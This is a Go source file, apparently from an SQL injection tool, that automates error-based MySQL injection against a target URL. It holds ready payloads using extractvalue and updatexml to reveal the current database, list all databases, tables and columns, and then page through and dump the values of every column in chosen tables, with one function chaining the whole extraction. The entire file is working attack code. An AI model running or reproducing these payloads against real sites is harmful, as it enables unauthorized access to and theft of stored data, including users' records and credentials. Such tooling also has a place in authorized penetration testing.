package error

import (
	"fmt"
	"github.com/c0rdXy/GoSM/myUtils"
	"github.com/c0rdXy/GoSM/myUtils/myhttp"
	"github.com/c0rdXy/GoSM/myUtils/output"
	"regexp"
	"strings"
)

// 获取当前使用的数据库
func getCurrentDatabase(baseURL string) []string {
	databasePayload := "1' and extractvalue(1,concat(1,(select database())))# -"
	result := attack(baseURL, databasePayload)
	if len(result) > 0 {
		return result
	}
	return nil
}

// 获取所有数据库名
func getDatabases(baseURL string) []string {
	databasesPayload := "1' and updatexml(1,concat((select group_concat(schema_name) from information_schema.schemata)),3)#"
	return attack(baseURL, databasesPayload)
}

// 获取所有表名
func getTables(baseURL, database string) []string {
	tablePayload := fmt.Sprintf("1' and updatexml(1,concat((select group_concat(table_name) from information_schema.tables where table_schema = '%s')),3)#", database)
	return attack(baseURL, tablePayload)
}

// 获取指定表的所有字段名
func getColumns(baseURL, tableName string) []string {
	columnPayload := fmt.Sprintf("1' and updatexml(1,concat((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '%s')),3)#", tableName)
	return attack(baseURL, columnPayload)
}

// 获取指定表的指定字段的值
func getColumnValues(baseURL, tableName, columnName string) []string {
	valuesPayload := "1' and updatexml(1,concat((SELECT GROUP_CONCAT(%s) FROM %s LIMIT %d,%d)),3)#"
	offset := 0
	limit := 50 // 调整 limit 的值
	var allValues []string

	for {
		payload := fmt.Sprintf(valuesPayload, columnName, tableName, offset, limit)
		result := attack(baseURL, payload)

		// 如果结果为空，表示已经获取完毕
		if result == nil || len(result) == 0 {
			break
		}

		allValues = append(allValues, result...)
		offset += limit
	}

	return allValues
}

// 攻击函数
func attack(url string, payload string) []string {
	text, check, err := myhttp.GetRequest(url, payload, myUtils.E)
	if err != nil {
		fmt.Println("Error sending request:", err)
	}
	if check {
		// 提取错误信息中的内容
		xpathErrorRegex := regexp.MustCompile(`XPATH syntax error: '(.*?)'`)
		matches := xpathErrorRegex.FindStringSubmatch(text)
		// 获取表名、字段名或字段值
		return getTableAndColumn(matches)
	}
	return nil
}

// 获取表名、字段名或字段值
func getTableAndColumn(matches []string) []string {
	if len(matches) > 1 {
		errorString := matches[1]
		// 以逗号分隔的字符串拆分成切片
		splitStrings := strings.Split(errorString, ",")
		if len(splitStrings) > 1 {
			return splitStrings[1:]
		}

		return splitStrings
	}
	return nil
}

// GetCurrentDatabase 打印当前数据库名
func GetCurrentDatabase(baseURL string) []string {
	currentDatabase := getCurrentDatabase(baseURL)
	output.PrintCurrentDatabases(currentDatabase)
	return currentDatabase
}

// GetAllDatabases 打印所有数据库名
func GetAllDatabases(baseURL string) []string {
	databases := getDatabases(baseURL)
	output.PrintDatabaseArray(databases)
	return databases
}

// GetTablesInDatabase 打印某个数据库的所有表
func GetTablesInDatabase(baseURL, database string) []string {
	tables := getTables(baseURL, database)
	output.PrintTables(tables)
	return tables
}

// GetColumnsAndValuesInTable 打印某个表的所有字段和内容
func GetColumnsAndValuesInTable(baseURL, tableName string) map[string][]string {
	result := make(map[string][]string)

	// 获取字段名
	columns := getColumns(baseURL, tableName)
	output.PrintColumns(columns)
	result["columns"] = columns

	// 获取每个字段的值
	for _, column := range columns {
		values := getColumnValues(baseURL, tableName, column)
		output.PrintColumnValuesArray(column, values)
		result[column] = values
	}

	return result
}

// 打印某些表的所有字段和内容
func GetColumnsAndValuesInTables(baseUrl string, tables []string) {
	for _, table := range tables {
		output.PrintTable(table)
		GetColumnsAndValuesInTable(baseUrl, table)
	}
}

func GetAllInfo(baseUrl string) {
	currentDatabase := GetCurrentDatabase(baseUrl)
	tablesInDatabase := GetTablesInDatabase(baseUrl, currentDatabase[0])
	GetColumnsAndValuesInTables(baseUrl, tablesInDatabase)
}
